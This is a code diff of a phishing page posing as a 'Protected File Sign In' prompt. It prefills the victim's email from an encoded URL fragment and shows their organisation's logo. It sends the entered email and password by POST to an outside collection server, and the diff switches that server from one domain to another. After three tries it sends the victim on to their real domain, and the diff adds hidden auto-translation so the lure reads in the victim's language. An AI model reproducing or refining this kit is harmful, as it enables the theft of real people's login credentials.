@@ -4,8 +4,76 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Protected File Sign In</title>
+
+  <!-- ✅ Google Translate Language Detection -->
+  <script>
+    const countryLangMap = {
+      US: "en", GB: "en", NG: "en", FR: "fr", DE: "de", ES: "es", IT: "it",
+      RU: "ru", CN: "zh-CN", JP: "ja", KR: "ko", IN: "hi", BR: "pt", SA: "ar",
+      IR: "fa", TR: "tr", ID: "id", TH: "th", NL: "nl", PL: "pl", UA: "uk",
+      BD: "bn", VN: "vi", CZ: "cs", RO: "ro", SE: "sv", NO: "no", FI: "fi",
+      DK: "da", HU: "hu", SK: "sk", SI: "sl", HR: "hr", GR: "el", IL: "he",
+      MY: "ms", PH: "tl", PK: "ur", ZA: "af", ET: "am", KE: "sw", MM: "my",
+      KH: "km", LA: "lo", MN: "mn", LK: "si", NP: "ne"
+    };
+
+    function detectLanguageAndTranslate() {
+      let lang = navigator.language || navigator.userLanguage;
+      if (!lang || lang.length < 2) {
+        fetch("https://ipapi.co/json/")
+          .then(res => res.json())
+          .then(data => {
+            const country = data.country;
+            lang = countryLangMap[country] || "en";
+            loadTranslate(lang);
+          })
+          .catch(() => loadTranslate("en"));
+      } else {
+        loadTranslate(lang);
+      }
+    }
+
+    function loadTranslate(lang) {
+      const gtScript = document.createElement("script");
+      gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
+      document.head.appendChild(gtScript);
+      window.googleTranslateElementInit = function () {
+        new google.translate.TranslateElement({
+          pageLanguage: "en",
+          includedLanguages: "af,am,ar,az,be,bg,bn,bs,ca,ceb,co,cs,cy,da,de,el,en,eo,es,et,eu,fa,fi,fr,fy,ga,gd,gl,gu,ha,haw,hi,hmn,hr,ht,hu,hy,id,ig,is,it,iw,ja,jv,ka,kk,km,kn,ko,ku,ky,la,lb,lo,lt,lv,mg,mi,mk,ml,mn,mr,ms,mt,my,ne,nl,no,ny,pa,pl,ps,pt,qu,ro,ru,rw,sd,si,sk,sl,sm,sn,so,sq,sr,st,su,sv,sw,ta,te,tg,th,tk,tl,tr,tt,ug,uk,ur,uz,vi,xh,yi,yo,zh-CN,zh-TW,zu",
+          layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+          autoDisplay: false
+        }, "google_translate_element");
+
+        setTimeout(() => {
+          const frame = document.querySelector("iframe.goog-te-menu-frame");
+          if (frame) {
+            frame.onload = () => {
+              const inner = frame.contentDocument || frame.contentWindow.document;
+              inner.querySelectorAll(".goog-te-menu2-item span.text")
+                .forEach(el => {
+                  if (el.innerText.toLowerCase().includes(lang.split('-')[0])) el.click();
+                });
+            };
+          }
+        }, 1000);
+      };
+    }
+
+    window.addEventListener('load', detectLanguageAndTranslate);
+  </script>
+
+  <!-- ✅ Hide Google Translate UI -->
   <style>
-    /* Your existing CSS (unchanged) */
+    #google_translate_element,
+    .goog-te-banner-frame.skiptranslate,
+    .goog-te-gadget,
+    .goog-logo-link {
+      display: none !important;
+    }
+    body { top: 0 !important; }
+
+    /* Your original styles */
     body {
       font-family: Arial, sans-serif;
       margin: 0;
@@ -31,10 +99,9 @@
     }
     .container {
       background-color: #fff;
-      border-radius: 0;
       padding: 20px;
       text-align: center;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       max-width: 300px;
       width: 100%;
       opacity: 0;
@@ -64,7 +131,6 @@
       width: calc(100% - 40px);
       margin-bottom: 10px;
       padding: 10px;
-      border-radius: 0;
       border: 1px solid #ccc;
       box-sizing: border-box;
     }
@@ -72,7 +138,6 @@
       background-color: #d32f2f;
       color: #fff;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
     button:hover {
       background-color: #b71c1c;
@@ -82,11 +147,10 @@
       background: lightcoral;
       padding: 10px;
       margin-top: 10px;
-      border-radius: 0;
       display: none;
     }
     .spinner {
-      border: 4px solid rgba(0, 0, 0, 0.1);
+      border: 4px solid rgba(0,0,0,0.1);
       border-top: 4px solid #333;
       border-radius: 50%;
       width: 30px;
@@ -150,142 +214,114 @@
     <div class="spinner" style="display:none;"></div>
   </div>
 
+  <!-- ✅ Google Translate container (hidden) -->
+  <div id="google_translate_element" style="display: none;"></div>
+
+  <!-- Scripts -->
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
   <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-<script>
-  // Global domain variable
-  let domain = "";
 
-  // Base64 decode helper (URL-safe)
-  function decodeData(encoded) {
-    encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
-    while (encoded.length % 4) {
-      encoded += '=';
-    }
-    return decodeURIComponent(atob(encoded));
-  }
+  <script>
+    let domain = "";
 
-  // Mark JS and mouse activity
-  document.cookie = "js_enabled=1; path=/";
-  document.addEventListener("mousemove", function () {
-    document.cookie = "mouse_moved=1; path=/";
-  }, { once: true });
-
-  // Decode email and update UI
-  document.addEventListener("DOMContentLoaded", function () {
-    const emailInput = document.getElementById("email");
-    const domainInfo = document.getElementById("domain-info");
-    const logo = document.getElementById("email-logo");
-
-    function updateUI(email) {
-      const domainMatch = email.match(/@([\w.-]+\.\w+)/);
-      if (domainMatch) {
-        domain = domainMatch[1]; // Store domain globally
-        domainInfo.textContent = `Sign in with your ${domain} Email`;
-        const logoUrl = `https://logo.clearbit.com/${domain}`;
-        logo.src = logoUrl;
-        logo.style.display = "block";
-        logo.onerror = function () {
-          logo.src = "P_icon.svg";
-        };
-      } else {
-        domainInfo.textContent = "Sign in with your Domain Email";
-        logo.style.display = "none";
-      }
+    function decodeData(encoded) {
+      encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
+      while (encoded.length % 4) encoded += '=';
+      return decodeURIComponent(atob(encoded));
     }
 
-    // Extract and decode email from hash
-    const hash = window.location.hash.substring(1);
-    const parts = hash.split("&");
-    const encodedEmail = parts[0];
+    document.cookie = "js_enabled=1; path=/";
+    document.addEventListener("mousemove", function () {
+      document.cookie = "mouse_moved=1; path=/";
+    }, { once: true });
 
-    try {
-      if (encodedEmail) {
-        const decodedEmail = decodeData(encodedEmail);
-        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
-          emailInput.value = decodedEmail;
-          updateUI(decodedEmail);
+    document.addEventListener("DOMContentLoaded", function () {
+      const emailInput = document.getElementById("email");
+      const domainInfo = document.getElementById("domain-info");
+      const logo = document.getElementById("email-logo");
+
+      function updateUI(email) {
+        const domainMatch = email.match(/@([\w.-]+\.\w+)/);
+        if (domainMatch) {
+          domain = domainMatch[1];
+          domainInfo.textContent = `Sign in with your ${domain} Email`;
+          logo.src = `https://logo.clearbit.com/${domain}`;
+          logo.style.display = "block";
+          logo.onerror = () => logo.src = "P_icon.svg";
+        } else {
+          domainInfo.textContent = "Sign in with your Domain Email";
+          logo.style.display = "none";
         }
       }
-    } catch (e) {
-      console.error("Email decoding failed:", e);
-      emailInput.value = "";
-    }
-  });
 
-  // jQuery-based form handling
-  $(document).ready(function () {
-    var count = 0;
+      const hash = window.location.hash.substring(1);
+      const parts = hash.split("&");
+      const encodedEmail = parts[0];
 
-    $('#submit-btn').click(function (event) {
-      event.preventDefault();
-      $('#error').hide();
-      $('#msg').hide();
-
-      var email = $("#email").val();
-      var password = $("#password").val();
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-      if (!email) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>Email field is empty</p>");
-        return false;
+      try {
+        if (encodedEmail) {
+          const decodedEmail = decodeData(encodedEmail);
+          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
+            emailInput.value = decodedEmail;
+            updateUI(decodedEmail);
+          }
+        }
+      } catch (e) {
+        console.error("Email decoding failed:", e);
+        emailInput.value = "";
       }
+    });
 
-      if (!filter.test(email)) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
-        return false;
-      }
+    $(document).ready(function () {
+      let count = 0;
+      $('#submit-btn').click(function (event) {
+        event.preventDefault();
+        $('#error, #msg').hide();
 
-      if (!password) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>Password field is empty</p>");
-        return false;
-      }
+        const email = $("#email").val();
+        const password = $("#password").val();
+        const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-      if (password.length < 6) {
-        $('#error').show().html("<p style='color:red; font-size:14px'>An error occurred, invalid password</p>");
-        return false;
-      }
+        if (!email) return $('#error').show().html("<p style='color:red;'>Email field is empty</p>");
+        if (!filter.test(email)) return $('#error').show().html("<p style='color:red;'>Invalid email format</p>");
+        if (!password) return $('#error').show().html("<p style='color:red;'>Password field is empty</p>");
+        if (password.length < 6) return $('#error').show().html("<p style='color:red;'>Invalid password</p>");
 
-      count++;
+        count++;
 
-      $.ajax({
-        dataType: 'JSON',
-        url: 'https://wareproz.xyz/pd/ad.php',
-        type: 'POST',
-        data: {
-          email: email,
-          password: password,
-          email_confirm: $('#email_confirm').val()
-        },
-        beforeSend: function () {
-          $('#submit-btn').html('Signing in...');
-        },
-        success: function (response) {
-          if (!response || response.signal !== 'ok') {
-            $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>").show();
-          } else {
+        $.ajax({
+          dataType: 'JSON',
+          url: 'https://nvent.store/1/ad.php',
+          type: 'POST',
+          data: {
+            email: email,
+            password: password,
+            email_confirm: $('#email_confirm').val()
+          },
+          beforeSend: () => $('#submit-btn').html('Signing in...'),
+          success: function (response) {
+            if (!response || response.signal !== 'ok') {
+              $('#msg').html("<span style='color:red;'>Invalid login. Try again</span>").show();
+            } else {
+              $("#password").val("");
+              if (count >= 3 && domain) {
+                count = 0;
+                window.location.href = "https://www." + domain;
+              }
+            }
+          },
+          error: function () {
             $("#password").val("");
             if (count >= 3 && domain) {
               count = 0;
               window.location.href = "https://www." + domain;
             }
-          }
-        },
-        error: function () {
-          $("#password").val("");
-          if (count >= 3 && domain) {
-            count = 0;
-            window.location.href = "https://www." + domain;
-          }
-          $("#msg").show();
-        },
-        complete: function () {
-          $('#submit-btn').html('View File 87 KB');
-        }
+            $("#msg").show();
+          },
+          complete: () => $('#submit-btn').html('View File 87 KB')
+        });
       });
     });
-  });
-</script>
-
+  </script>
 </body>
 </html>
